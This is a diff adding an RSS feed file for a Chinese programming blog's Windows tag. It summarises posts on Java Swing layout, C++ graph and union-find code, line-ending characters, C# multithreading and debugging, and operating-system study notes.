@@ -1,0 +1,767 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Windows on bystander&#39;s blog</title>
+    <link>https://leizhiyuan.github.io/tags/windows/</link>
+    <description>Recent content in Windows on bystander&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-CN</language>
+    <lastBuildDate>Mon, 03 Mar 2014 21:17:20 +0000</lastBuildDate>
+    
+	<atom:link href="https://leizhiyuan.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>[藏]运用 BoxLayout 进行 Swing 控件布局</title>
+      <link>https://leizhiyuan.github.io/2014/03/03/%E8%97%8F%E8%BF%90%E7%94%A8-boxlayout-%E8%BF%9B%E8%A1%8C-swing-%E6%8E%A7%E4%BB%B6%E5%B8%83%E5%B1%80/</link>
+      <pubDate>Mon, 03 Mar 2014 21:17:20 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2014/03/03/%E8%97%8F%E8%BF%90%E7%94%A8-boxlayout-%E8%BF%9B%E8%A1%8C-swing-%E6%8E%A7%E4%BB%B6%E5%B8%83%E5%B1%80/</guid>
+      <description>写的非常非常好的一个教程，感谢陈 怡平
+引言 在用户使用 Java Swing 进行用户界面开发过程中，会碰到如何对 Java Swing 的控件进行布局的问题。Swing 的控件放置在容器 (Container) 中，容器就是能够容纳控件或者其它容器的类，容器的具体例子有 Frame、Panel 等等。容器需要定义一个布局管理器来对控件进行布局管理，Swing 当中提供的主要的布局管理器有 FlowLayout、BorderLayout、BoxLayout、GridLayout 和 GridBaglayout, 它们的主要特点如表 1 所示：
+表 1. Swing 中的一些主要布局管理器的比较   布局管理器 特点     FlowLayout 把控件按照顺序一个接一个由左向右的水平放置在容器中，一行放不下，就放到下一行   BorderLayout 将整个容器划分成东南西北中五个方位来放置控件，放置控件时需要指定控件放置的方位   BoxLayout 可以指定在容器中是否对控件进行水平或者垂直放置，比 FlowLayout 要更为灵活   GridLayout 将整个容器划分成一定的行和一定的列，可以指定控件放在某行某列上   GridBagLayout 是 Swing 当中最灵活也是最复杂的布局管理器，可对控件在容器中的位置进行比较灵活的调整    本文主要关注在 BoxLayout 布局管理器的使用上。我们首先对 BoxLayout 作一下介绍。
+BoxLayout 介绍 如前所述，BoxLayout 可以把控件依次进行水平或者垂直排列布局，这是通过参数 X_AXIS、Y_AXIS 来决定的。X_AXIS 表示水平排列，而 Y_AXIS 表示垂直排列。BoxLayout 的构造函数有两个参数，一个参数定义使用该 BoxLayout 的容器，另一个参数是指定 BoxLayout 是采用水平还是垂直排列。下面是一个创建 BoxLayout 实例的例子：   JPanel panel=new JPanel(); BoxLayout layout=new BoxLayout(panel, BoxLayout.</description>
+    </item>
+    
+    <item>
+      <title>邻接表实现无向图(C&#43;&#43;)</title>
+      <link>https://leizhiyuan.github.io/2013/05/31/%E9%82%BB%E6%8E%A5%E8%A1%A8%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%90%91%E5%9B%BEc--/</link>
+      <pubDate>Fri, 31 May 2013 15:05:29 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/05/31/%E9%82%BB%E6%8E%A5%E8%A1%A8%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%90%91%E5%9B%BEc--/</guid>
+      <description>很早以前写的代码了，贴出来做个备份吧。用向量来存储一条邻接链表，存储可连通值。实现了判断是否连通，添加边，添加顶点的功能。
+UnDirectGraph.h #pragma once
+#include &amp;ldquo;stdafx.h&amp;rdquo; #include &amp;lt;vector&amp;gt; using namespace std; class UnDirectGraph { private: int vCount; vector&amp;lt;int&amp;gt; *adj; public: int GetVCount(); UnDirectGraph(int vCount); void AddEdge(int v,int w); vector&amp;lt;int&amp;gt; &amp;amp;Vadj(int v); bool IsConnected(int v,int w); }; UnDirectGraph.cpp #pragma once
+#include &amp;ldquo;stdafx.h&amp;rdquo; #include &amp;ldquo;UnDirectGraph.h&amp;rdquo; using namespace std; UnDirectGraph::UnDirectGraph(int _vCount) { this-&amp;gt;vCount=_vCount; adj=new vector&amp;lt;int&amp;gt;[vCount];
+for (int i=0;i&amp;amp;lt;vCount;i++) { adj[i].clear(); } } void UnDirectGraph::AddEdge(int v,int w) { adj[v].push_back(w); adj[w].push_back(v); }
+vector&amp;lt;int&amp;gt;&amp;amp; UnDirectGraph::Vadj(int v) { return adj[v]; }</description>
+    </item>
+    
+    <item>
+      <title>求整数1-N范围和为N的所有组合</title>
+      <link>https://leizhiyuan.github.io/2013/05/27/%E6%B1%82%E6%95%B4%E6%95%B01-n%E8%8C%83%E5%9B%B4%E5%92%8C%E4%B8%BAn%E7%9A%84%E6%89%80%E6%9C%89%E7%BB%84%E5%90%88/</link>
+      <pubDate>Mon, 27 May 2013 10:55:49 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/05/27/%E6%B1%82%E6%95%B4%E6%95%B01-n%E8%8C%83%E5%9B%B4%E5%92%8C%E4%B8%BAn%E7%9A%84%E6%89%80%E6%9C%89%E7%BB%84%E5%90%88/</guid>
+      <description>看到的一道题，给出答案
+问题：找出整数1~N范围和为N的所有集合，集合里的数不允许重复。
+解答：递归吧
+代码如下： #include &amp;ldquo;stdafx.h&amp;rdquo; #include &amp;lt;iostream&amp;gt; using namespace std;
+void PrintResult(int *log,int index) { for (int i = 0; i &amp;lt;index; ++i) { cout&amp;lt;&amp;lt;log[i]&amp;lt;&amp;lt;&amp;rdquo; &amp;ldquo;; } cout&amp;lt;&amp;lt;endl; }
+void CalCombination(int* log,int startNum,int N,int &amp;amp;index) { if (N==0) { PrintResult(log,index); }
+else { for (int i = startNum; i &amp;amp;lt;= N; ++i) { log[index++]=i; CalCombination(log,i+1,N-i,index); } } index--; }
+int _tmain(int argc, _TCHAR* argv[]) { cout&amp;lt;&amp;lt;&amp;ldquo;请输入N:&amp;ldquo;; int N=20; cin&amp;gt;&amp;gt;N; int *log=new int[N]; int index=0; CalCombination(log,1,N,index); } 要是允许重复，也简单，将递归中的这句话改为： CalCombination(log,i,N-i,index); 同理，还可以解决类似给定一个数组，让求和为N的元素组合，只需要现将元素排个序，然后思路相同。</description>
+    </item>
+    
+    <item>
+      <title>并查集(C&#43;&#43;实现)</title>
+      <link>https://leizhiyuan.github.io/2013/04/11/%E5%B9%B6%E6%9F%A5%E9%9B%86c--%E5%AE%9E%E7%8E%B0/</link>
+      <pubDate>Thu, 11 Apr 2013 08:45:38 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/04/11/%E5%B9%B6%E6%9F%A5%E9%9B%86c--%E5%AE%9E%E7%8E%B0/</guid>
+      <description>并查集这个很有意思，并查集是一种树型的数据结构，用于处理一些不相交集合（Disjoint Sets）的合并及查询问题。昨天看书看到了，然后用C++简单实现了下。在Dijkstra算法中，用来判断两个顶点是否在同一个集合里。
+里面定义了两个类，都是并查集，一个是QuickFind，查找很快，一个是QuickUnion，合并较快。写了一些注释，有一些优化的提示.看代码吧，有什么问题指出来吧。
+QuickFind的实现 #include &amp;ldquo;QuickFind.h&amp;rdquo;
+QuickFind::QuickFind(int N) { size=N; id=new int[N]; for(int i=0;i&amp;lt;N;i++) { id[i]=i; } }
+bool QuickFind::Find(int p,int q) { return id[p]==id[q]; }
+void QuickFind::Unite(int p,int q) { int pid=id[p]; for(int i=0;i&amp;lt;size;i++) if(id[i]==pid) id[i]=id[q];
+} QuickFind::~QuickFind(void) { delete []id; } QuickUnion的实现 #include &amp;ldquo;QuickUnion.h&amp;rdquo;
+QuickUnion::QuickUnion(int N) { size=N; id=new int[N]; for(int i=0;i&amp;lt;N;i++) { id[i]=i; } } int QuickUnion::root(int i) { while (i!=id[i]) { //id[i]=id[id[i]]; 若添加这句话则为压缩路径 i=id[i]; } return i; } bool QuickUnion::Find(int p,int q) { return root(p)==root(q); }</description>
+    </item>
+    
+    <item>
+      <title>和
+浅析</title>
+      <link>https://leizhiyuan.github.io/2013/04/05/%E5%92%8C%E6%B5%85%E6%9E%90/</link>
+      <pubDate>Fri, 05 Apr 2013 13:29:04 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/04/05/%E5%92%8C%E6%B5%85%E6%9E%90/</guid>
+      <description>这两个转义字符最初学习C++的时候看到了,当时没多想，后来某一天突然想起来，回车不就是换行吗？这不是多此一举吗？今天又看到，索性查了下相关资料，整理一下，留作记录.
+关于“回车”（carriage return）和“换行”（line feed）这两个概念的来历和区别。
+在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33）的玩意，每秒钟可以打10个字符。但是它有一个问题，就是打完一行换行的时候，要用去0.2秒，正好可以打两个字符。要是在这0.2秒里面，又有新的字符传过来，那么这个字符将丢失。
+于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做“回车”，告诉打字机把打印头定位在左边界；另一个叫做“换行”，告诉打字机把纸向下移一行（这句的意思是把纸向上拉，然后打印头就定位到了下一行），可以想象一下，这个打印头只能在一个固定的水平线上左右移动，而不能上下移动，我们通过移动纸来完成打印下一行。
+不明白的我在youtube上找到一个这种打字机的演示视频，为了方便读者观看，我提供一个下载地址。
+后来，计算机发明了，这两个概念也就被般到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了，加一个就可以。于是，就出现了分歧。
+Unix系统里，每行结尾只有&amp;rdquo;&amp;lt;换行&amp;gt;&amp;ldquo;，即&amp;rdquo;\n&amp;rdquo;；
+Windows系统里面，每行结尾是&amp;rdquo;&amp;lt;换行&amp;gt;&amp;lt;回车&amp;gt;&amp;ldquo;，即&amp;rdquo;\n\r&amp;rdquo;；
+Mac系统里，每行结尾是&amp;rdquo;&amp;lt;回车&amp;gt;&amp;ldquo;，不过mac基于unix，所以换行也应该是可以的。
+一个直接后果是，Unix/Mac系统下的文件在Windows里打开的话，所有文字会变成一行；而Windows里的文件在Unix/Mac下打开的话，在每行的结尾可能会多出一个^M符号。这个如果你在windows下使用vim也会发现这个情况
+用C++来说明
+如： int main() { cout &amp;lt;&amp;lt; &amp;ldquo;leaver.me&amp;rdquo; &amp;lt;&amp;lt; &amp;ldquo;\r&amp;rdquo; &amp;lt;&amp;lt; &amp;ldquo;bystander&amp;rdquo; ; return 0; } &amp;nbsp;
+最后只显示 bystander 而 leaver.me 背覆盖了
+\n 是换行，系统会将其替换成回车＋换行 把光标 先移到 行首 然后换到下一行 也就是 下一行的行首拉 int main() { cout &amp;lt;&amp;lt; &amp;ldquo;leaver.me&amp;rdquo; &amp;lt;&amp;lt; &amp;ldquo;\n&amp;rdquo; &amp;lt;&amp;lt; &amp;ldquo;bystander&amp;rdquo; ; return 0; } 则 显示
+leaver.me
+bystander
+一句话，这看起来是一个历史遗留问题&amp;hellip;&amp;hellip;</description>
+    </item>
+    
+    <item>
+      <title>[E].Net 多线程指南</title>
+      <link>https://leizhiyuan.github.io/2013/03/06/e.net-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%8C%87%E5%8D%97/</link>
+      <pubDate>Wed, 06 Mar 2013 22:28:20 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/03/06/e.net-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%8C%87%E5%8D%97/</guid>
+      <description>这是codeproject上的一个系列。我看完了。收获匪浅。可惜作者之后未能更新预想中的总结贴，多少有些可惜，不过。此系列非常非常不错。建议想学习.net多线程的看看。
+1.net 多线程介绍 Introduction into threading in .NET
+2.线程周期/线程优势/陷阱 Lifecycle of threads/Threading opportunities/Traps 
+3.线程同步 Synchronization
+4.线程池 Thread Pools
+5.UI中的线程应用 Threading in UIs (WinForms / WPF / Silverlight)</description>
+    </item>
+    
+    <item>
+      <title>C#中的Debug类</title>
+      <link>https://leizhiyuan.github.io/2013/03/01/c#%E4%B8%AD%E7%9A%84debug%E7%B1%BB/</link>
+      <pubDate>Fri, 01 Mar 2013 22:57:22 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/03/01/c#%E4%B8%AD%E7%9A%84debug%E7%B1%BB/</guid>
+      <description>位于命名空间System.Diagnostics中 1.Debug.Print方法
+Debug.Print(&#34;Today: {0}&#34;, DateTime.Today); 2.Debug.WriteLine方法
+Debug.WriteLine(&#34;Have a nice day&#34;); 3.TraceListener类
+DelimitedListTraceListener创建的时候指定一个文件名，当Flush调用的时候，就被覆写到文件里。
+TraceListener listener = new DelimitedListTraceListener(@&#34;C:\debugfile.txt&#34;); // Add listener. Debug.Listeners.Add(listener); // Write and flush. Debug.WriteLine(&#34;Welcome&#34;); Debug.Flush(); 4.Debug.Write和WriteIf以及WriteLineIf方法
+Debug.WriteLineIf(IsThursday(), &#34;Thursday&#34;);  第一个参数一个bool值，为真则输出。
+5.Debug.Assert方法
+Debug.Assert(value != -1, &#34;Value must never be -1.&#34;); 如果表达式为false，则输出。</description>
+    </item>
+    
+    <item>
+      <title>C#多线程揭秘</title>
+      <link>https://leizhiyuan.github.io/2013/02/12/c#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%8F%AD%E7%A7%98/</link>
+      <pubDate>Tue, 12 Feb 2013 16:31:22 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/02/12/c#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%8F%AD%E7%A7%98/</guid>
+      <description>文章略长。。。 Demo下载：Demo.Threading.zip 介绍 本文将通过一些例子来展示.net 中如何实现多线程，涉及到以下四部分。 1 .线程概念 2 .如何实现多线程 3 .如何确保线程安全 4 .死锁
+什么是进程 一个进程就是一个可执行文件运行的操作系统上下文环境。它被用来分隔虚拟地址空间，线程，对象句柄（指向类似文件这样的资源的指针），以及环境变量，进程还有一些类似优先级类和最大内存分配的属性。
+也就是说： 1 .一个进程就是一个包含资源的内存块。 2 .操作系统执行的一个单独的任务。 3 .一个正在运行的软件 4 .一个进程拥有一个/多个操作系统线程
+一般的。一个进程最大可以是4GB的内存空间，这块内存是安全，私有，其他进程是无法访问的。
+什么是线程 一个线程就是在一个进程里执行的一条指令流，所有的线程都在一个进程里执行，也就是一个进程可以包含多个线程。线程公用进程的虚拟地址空间。线程是操作系统的调度单元。一个线程的上下文由操作系统进行保存/恢复。 也就是说： 1 .一个线程是进程里的一条指令流。 2 .所有的线程在进程里。一个进程可以有多个线程 3 .一个进程的所有线程使用进程的虚拟地址空间。
+什么是多线程 多线程指的是进程同时有多个线程活动。这可以通过时间片的线程模拟或是多cpu上的超线程来实现。可以提高性能。 多线程-为什么或是为什么不? 为什么多线程 1 .保持UI响应。 2 .提高性能(对于cpu密集型和I/O密集型的进程) 为什么不多线程 1 .过度使用降低性能 2 .代码复杂，增加设计时间，潜在的bug
+线程池 线程池为你的程序提供了一个由操作系统管理的机制。在线程池里的都是后台线程。一个线程池线程在程序的前台线程都退出后，也会推出。每个进程一个线程池。默认情况下。每个处理器会为进程分配25个线程。但是可以通过SetMaxThreads 方法来改变。
+.net 中的线程 在.net 中，线程可以通过下面6个方法来实现。 1 .Thread线程类 2 .Delegates委托 3 .Background Worker 4 .ThreadPool 线程池 5 .Task任务类 6 .Parallel并行类
+下面的几部分里。我将逐一展示实现方法。
+简而言之，多线程就是通过使程序同时运行多个任务来最大化计算机能力，同时能够保持UI响应。下图是一个例子的图示。</description>
+    </item>
+    
+    <item>
+      <title>操作系统的死锁和内存管理</title>
+      <link>https://leizhiyuan.github.io/2013/02/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%AD%BB%E9%94%81%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</link>
+      <pubDate>Sat, 02 Feb 2013 06:58:09 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/02/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%AD%BB%E9%94%81%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</guid>
+      <description>这部分是最后一部分笔记。《现代操作系统》第三版的笔记就这样了。 死锁； 把需要排他性使用的对象称为资源，资源分为可抢占的和不可抢占的。可抢占资源可以从拥有它的进程中抢占而不会具有任何副作用。存储器就是可抢占的。不可抢占资源是指在不引起相关的计算失败的情况下，无法把它从占有她的进程处抢占过来。比如CD刻录机，如果一个进程开始刻盘，突然分配给CD刻录机到另一进程，就会划坏CD盘。死锁会发生在不可抢占资源中 死锁的规范定义：如果一个进程集合中的每个进程都在等待只能由该进程集合中的其他进程才能引发的事件，那么，该进程集合就是死锁的。
+死锁的四个必要条件 1.互斥条件。每个资源要么已经分配给一个进程，要么就是可用的。 2.占有和等待条件，已经得到了某个资源的进程可以再请求新的资源。 3.不可抢占条件，已经分配给一个进程的资源不可强制性的被抢占，他只能由占有她的进程显式的释放。 4.环路等待条件。死锁发生时，系统中一定有友两个/多个进程组成的一条回路，该环路中的每个进程都在等待着下一个进程所占有的资源。
+死锁处理的四种策略 1.忽略该问题，如果可以忽略。则忽略 2.检测死锁并恢复，让死锁发生，检测他们是否发生，一旦发生。采取行动。 3.仔细对资源进行分配。动态的避免死锁。 4.通过破坏引起的四个必要条件之一。防止死锁发生。
+银行家算法就是对每个请求进行检查。检查如果满足这一请求是否会达到安全状态，或是，那么满足这请求，若否。就推迟这一请求的满足。为了看状态是否安全。类似于银行家投资。看自己是否有足够的资源满足客户。如果可以。就认为投资是可以收回的。接着检查最接近最大限额的一个客户。如果所有投资最终都被收回。则该状态安全。
+通信死锁：两个/以上的进程发送消息通信。A向B发送请求信息，然后阻塞直到B回复。假设请求信息丢失，A将阻塞等待回复。B则阻塞等待一个向其发送命令的请求。则发生死锁。他不能通过对资源排序/安排调度来避免，因此。采用了超时来中断通信死锁。
+活锁：两个进程A和B，A获得1.B获得2.轮询请求对方的。没有进程被阻塞。看起来像是死锁发生了。就叫做活锁。
+内存管理 每个linux进程都有一个地址空间，逻辑上有三段组成：代码。数据和堆栈段。代码段包含了形成程序可执行代码的机器指令。通常是只读的。是由编译器把源码转换成机器码形成的。 数据段包含了所有程序变量。字符串。数字和其他数据的存储。由两部分，初始化数据和未初始化数据。后者即为BSS，符号起始块。加载后被初始化为0.数据段可以修改。可以增加数据段的大小。 第三段是栈段。大多数机器里。从虚拟地址空间的顶部/附近开始。并且向下生长。
+linux内存由三部分组成。前两部分是内核和内存映射，被钉在内存中。页面从不换粗。内存的其他部分，被划分为页框。每个页框都可以包含一个代码。数据或栈页面。
+window如何知道系统配置的细节呢。答案就是windows会挂载一种特殊的文件系统，其为小文件做了优化，到名字空间，也就是注册表。注册表被阻止成了不同的卷，称作储巢。hive。一个叫做system的储巢会在系统启动时。装入内存。这里面包含了驱动什么设备工作。什么软件要初始化。那些变量等等。</description>
+    </item>
+    
+    <item>
+      <title>操作系统中的输入输出</title>
+      <link>https://leizhiyuan.github.io/2013/02/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</link>
+      <pubDate>Fri, 01 Feb 2013 08:43:18 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/02/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</guid>
+      <description>输入输出 I/O硬件： I/O设备分为两类：块设备和字符设备，块设备吧信息存储在固定大小的块中，每个块有自己的地址，传输以块为单位，每个块都能独立于其他块读写，硬盘，CD-ROM和USB盘都是常见的块设备。字符设备是以字符为单位发送和接收一个字符流，而不考虑任何块结构，字符设备不可寻址，也不寻道，打印机，网络几口，鼠标，以及大多数与磁盘不同的设备都可看作是字符设备。
+I/O设备一般由机械部件和电子部件两部分组成，通常分开处理，实现模块化和通用设计，电子部件称作设备控制器/适配器，在个人计算机上，通常以主板上的芯片的形式出现，或者以插入PCI的印刷电路板的形式出现。控制器卡上通常有一个连接器，通向设备本身的电缆可以插入到这个连接器中， 控制器的任务是吧串行的位流转换成字节块，并进行必要的错误校正工作，字节块通常首先在控制器内部的一个缓冲区中按位进行组装，然后再对校验和进行校验并证明字节块没有错误后再将它复制到主存中。
+每个控制器都有几个寄存器用来和cpu通信，通过写入这些寄存器，操作系统可以命令设备发送数据等等操作。 1.内存映射io 将所有控制寄存器映射到内存空间中，每个寄存器被分配一个唯一的内存地址，并且不会有内存被分配这一地址，这样的系统称为内存映射I/O，通常位于地址空间的顶端。使用内存映射io，设备控制器只是内存中的变量，c语言可以和其他变量一样寻址，这样，I/O设备驱动程序就可以采用c语言编写。 2.DMA 无论CPU是否具有内存映射I/O,他都需要寻址设备控制器以便和他们交换数据，但浪费eficpu时间，所以经常使用直接存储器存储。可独立于cpu访问地址总线。
+没有DMA的时候，首先控制器从磁盘驱动器串行的一位一位的读一个块，直到将整块信息放入控制器的内存缓冲区中，接着，他计算校验和，以保证没有读错误发生，然后控制器产生一个中断，当操作系统开始运行时，它重复地从控制器的缓冲区中一次一个字节/一个字的读取该块的信息，并将其放入内存中。 当有DMA的时候，首先CPU通过设置DMA控制器的寄存器对它进行编程，所以DMA控制器知道将什么数据传送到什么地方，(第1步)DMA控制器还要向磁盘控制器发送一个命令，通知他从磁盘读数据到其内部的缓冲区中，并且对校验和进行检验，如果磁盘控制器中的缓冲区中的数据是有效的的。那么DMA开始 DMA控制器通过在总线上发出一个读请求到磁盘控制器而发起DMA传送（第2步），这一读请求和其他一样，并且磁盘控制器并不关心是来自DMA还是CPU，一般情况下，要写的内存地址在总线的地址线上，所以磁盘控制器从内部缓冲区中读取下一个字的时候，她知道要写的什么地方，写到内存是另一个标准总线周期，（第3步） 当写操作完成时，磁盘控制器在总线上发起一个应答信号到DMA（第4步），于是DMA控制器部增要使用的内存地址，并且步减字节计数，如果字节计数仍然大于0，则从父2-4步。完成后产生中断告诉cpu，操作系统开始工作时，数据已经在内存中了。 中断： 将机器留在一个明确状态的中断称为精确中断，四个特征，1.PC保存在一个已知的地方。2.PC所指向的指令之前的所有指令都已经完全执行。3.PC所指向的指令之后的所有指令都没有执行。4.PC所指向的指令的执行状态是已知的。注意，对于PC所指向的指令以后的指令，并没有禁止他们开始执行，而只是要求在中断发生之前必须撤销他们对寄存器或内存所做的任何修改。 I/O软件： 设计I/O软件时一个关键的点就是设备独立性，意思是我们可以访问任意I/O设备而无需事先指定设备。也就是对于不同的I/O硬件。同一段程序是可以的。
+具有标准接口的驱动程序的工作方式如下：对于每一种设备类型，例如磁盘和打印机。操作系统定义一组驱动程序必须支持的函数，对于磁盘而言，这些函数自然的包含读和写，除此之外还包含开启和关闭电源，格式化以及其他与磁盘有关的事情。驱动程序通常包含一张表格，这张表格具有针对这些函数指向驱动程序自身的指针。当驱动程序装载时，操作系统记录下这张函数指针表的地址。所以当操作系统需要调用一个函数时，可以通过表格发出间接调用。这张函数指针表定义了驱动程序与操作系统其他部分之间的接口。
+双缓冲：当第二个缓冲区正在复制用户空间的时候，第一个缓冲区用来接收新的字符。以这样的方法。两个缓冲区轮流使用。称为双缓冲。
+磁盘臂调度算法： 读/写一个磁盘块需要时间：1.寻道时间（将磁盘臂移动到适当的柱面上所需的时间）2.旋转延迟（等待适当扇区旋转到磁头下所需的时间）。3.实际数据传输时间。
+一个磁盘子系统具有如下特性：当一个写命令发给它时，磁盘要么正确地写数据，要么什么也不做，让现有的数据完整无缺的留下，这样的系统称为稳定存储器，并且是在软件中实现的。目标是不惜一切代价保持磁盘的一致性。
+时钟：两种。1种是直接接到电源线上。就可以每个电压周期产生一个终端。现在比较少。另一种是由晶体振荡器，计数器和存储寄存器三个构成。当把一块石英晶体适当的切割并且安装到一定的压力之下时就可以产生非常精确的周期性信号。时钟启动时，存储寄存器的值被复制到计数器中，每一个脉冲使计数器-1，直到为0，产生中断。</description>
+    </item>
+    
+    <item>
+      <title>操作系统中的页面置换算法</title>
+      <link>https://leizhiyuan.github.io/2013/01/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/</link>
+      <pubDate>Wed, 30 Jan 2013 09:18:05 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/01/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/</guid>
+      <description>最近读完了《现代操作系统》。页面置换算法的读书笔记。其他的笔记慢慢整理一下在博客做个备份。  虚拟内存的基本思想：每个程序都拥有自己的内存空间，这个空间被分割成很多块，每一块称为一页/页面，每一页有连续的地址范围，这些页被映射到物理内。 页面置换算法 1.最优页面置换算法，每个页面都可以用在该页面首次被访问前所需要执行的指令数作为标记。因此我们选择标记最大的页面，也就是把不愉快的事情往后拖延。但是，唯一的问题是无法实现。 2.最近未使用页面置换算法。系统每一个页面设置两个状态位，当页面被访问时设置R位，当被修改时设置M位，包含在页表项中，初始时，都被设置0，R被定期地清零，以区别最近没有被访问和被访问的页面。NRU算法随机的从类编号最小的非空类中挑选一个页面淘汰之， 根据R和W可以将页面分为4类 0没有被访问，没有被修改/1没有被访问，被修改/2已被访问，没有被修改/3已被访问，已被修改。第一类只有在定期清R的时候才会出现。 隐含的意思是，淘汰一个没有被访问的已修改页面要比淘汰一个被频繁使用的干净页面要好。 3.先进先出置换，找出最先进入的替换掉，很少单独使用 4.第二次机会页面置换算法。FIFO可能将经常使用的页面置换出来。为此，检查最老页面的r位，如果R为0，则既老又没有被使用，则就置换掉，如果是1，就清0，放在链表尾，修改装入时间为最新。继续搜索。 5.时钟页面置换算法，第二次机会算法经常要在链表中移动页面，更好的方法是将页面保存在一个类似钟面的环形链表中，表针指向最老的页面。发生缺页时，如果R是0就 淘汰该页面，并插入新页面，然后表针前移，如果是1，就清除R并前移，直到找到一个R位为0的页面。这也是时钟的由来  6.最近最少使用页面置换算法。在发生缺页时，置换未使用时间最长的页面，这个策略称为LRU，最简单的一个实现策略是有一个64位计数器，每条指令执行完加1.每个页表项必须有一个足够容纳这个计数器值的域，每次访问内存后，将C值保存到被访问页面的页表项，一旦中断，检查所有页面项的计数器值，找到最小的即可。 7.NFU最不常用算法，是LRU的软件模拟实现。每个页面与一个软件计数器管理。初值为0，每次时钟中断时，操作系统扫描内存中的所有页面，将每个页面中的R位值加到他的计数器上，计数器的值即为访问的频繁程度。该算法的问题是记住的事情太多，如果第一次执行扫描的时间最长。比如第一次某个页面的值很大。这个很大的值会影响到下一次扫描，结果操作系统将置换有用的页面而不是不再使用的页面。 8.修改一下NFU：R位被加进之前，将计数器右移一位，同时将R加到计数器的左端。即为老化算法 9.工作集页面置换算法。一个进程当前正在使用的页面的集合称作他的工作集。基本思路是找出一个不在工作集中的页面并淘汰它。 10.工作集时钟页面置换算法。基于时钟算法，并且使用了工作集信息。
+页面调度算法总结；  最好的两种算法是老化算法和工作集时钟算法，分别基于LRU和工作集。具有良好的页面调度性能。</description>
+    </item>
+    
+    <item>
+      <title>C# 基础知识系列文章索引</title>
+      <link>https://leizhiyuan.github.io/2013/01/27/c#-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E7%B4%A2%E5%BC%95/</link>
+      <pubDate>Sun, 27 Jan 2013 20:50:08 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/01/27/c#-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E7%B4%A2%E5%BC%95/</guid>
+      <description>清理GR的加星标项目。分享来自博客园 zhili 的C#基础系列文章。
+C#基础知识系列终于告了一个段落了, 本系列中主要和大家介绍了C#1.0到C# 4.0中一些重要的特性，刚开始写这个专题的初衷主要是我觉得掌握了C#这些基础知识之后，对于其他任何的一门语言都是差不多的，这样可以提高朋友们对其他语言的掌握，以及可以让大家更加迅速地掌握.NET的新特性， 并且相信这个系列对于找工作的朋友也是很有帮助的，因为很多公司面试都很看重基础知识是否扎实，是否对C#有一个全面的认识和理解，所以很多公司面试都会问到一些C#基础概念的问题，例如，经常面试会问：你是如何理解委托的，如何理解匿名函数等问题。
+然而这个系列中并没有介绍COM互操作性的内容以及.Net 4.5中的一些新特性，所以后面将会对这两个方面的内容进行补充，由于这个系列托的太久了(大概也有3个月吧)，所以就先告一段落的，后面将会带来.NET互操作性系列的介绍。下面就为这个系列文章做一个索引，方便大家收藏和查找。
+C#基础知识系列索引
+C#1.0
+1. 深入解析委托——C#中为什么要引入委托
+2. 委托本质论
+3. 如何用委托包装多个方法——委托链
+4. 事件揭秘
+5. 当点击按钮时触发Click事件背后发生的事情
+C# 2.0
+6. 泛型基础篇——为什么引入泛型
+7. 泛型深入理解(一)
+8. 泛型深入理解(二)
+9. 深入理解泛型可变性
+10. 全面解析可空类型
+11. 匿名方法解析
+12. 迭代器
+C# 3.0
+13. 全面解析对象集合初始化器、匿名类型和隐式类型
+14. 深入理解Lambda表达式
+15. 全面解析扩展方法
+16. Linq介绍
+C# 4.0
+17. 深入理解动态类型
+&amp;nbsp;
